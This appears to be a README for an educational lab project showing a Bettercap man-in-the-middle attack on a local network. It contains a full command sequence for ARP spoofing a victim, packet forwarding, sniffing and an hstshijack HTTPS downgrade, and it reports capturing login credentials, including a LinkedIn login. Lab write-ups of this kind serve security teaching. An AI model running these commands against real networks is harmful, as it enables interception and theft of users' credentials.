# Man-in-the-Middle-Attack-using-Bettercap
This project demonstrates a **Man-in-the-Middle (MITM) attack** using Bettercap, performed in a **controlled lab environment** for **educational and cybersecurity awareness purposes only**.

Using a Kali Linux attacker machine and a Windows victim machine on the same local network, the attacker was able to:
- Spoof ARP traffic and become the "man in the middle"
- Sniff and capture network data
- Downgrade HTTPS to HTTP using the `hstshijack` caplet
- Capture login credentials from a vulnerable test site (`testphp.vulnweb.com`)

---

## 🛠️ Tools Used

| Tool        | Purpose                   |
|-------------|---------------------------|
| Kali Linux  | Attacker system           |
| Bettercap   | MITM attack framework     |
| Wireshark   | Network packet analysis   |
| Windows 10  | Victim system             |
| hstshijack  | HTTPS to HTTP downgrade   |

---

## 🧪 Lab Setup

- **Attacker Machine (Kali Linux)**: `192.168.0.180`
- **Victim Machine (Windows 10)**: `192.168.0.173`
- Both machines were connected to the same local network.

---

## 🧾 Bettercap Commands Used

All commands were stored in a file called `commands.cap` and executed in sequence:

```bash
# Start Bettercap
bettercap -iface eth0

# Enable host discovery
net.probe on

# Enable ARP spoofing
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.0.173
arp.spoof on

# Enable packet forwarding on Kali
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Enable local packet sniffing
net.sniff.local true
net.sniff on

# Downgrade HTTPS using hstshijack
set hstshijack.targets *
hstshijack/hstshijack

🔍 Results
✅ Captured Credentials
Successfully captured username and password submitted to the vulnerable site http://testphp.vulnweb.com.
Refer to: screenshots/vulnweb_credentials.png

✅ HTTPS Downgrade (LinkedIn)
Successfully downgraded LinkedIn HTTPS to HTTP in a test environment, capturing the POST request with login data.
Refer to: screenshots/linkedin_http_downgrade.png

✅ Traffic Analysis
All captured traffic was saved and analyzed using Wireshark.
File: captures/mitm_traffic.pcapng

⚠️ Disclaimer
This project was carried out in a controlled lab environment and is intended solely for educational and ethical hacking purposes.
Performing these actions on any network or system without explicit authorization is illegal and unethical.
The author is not responsible for any misuse of the information provided in this repository.

📜 License
This project is licensed for non-commercial, academic, and educational use only.
You are welcome to fork or reference it in your own studies or reports.
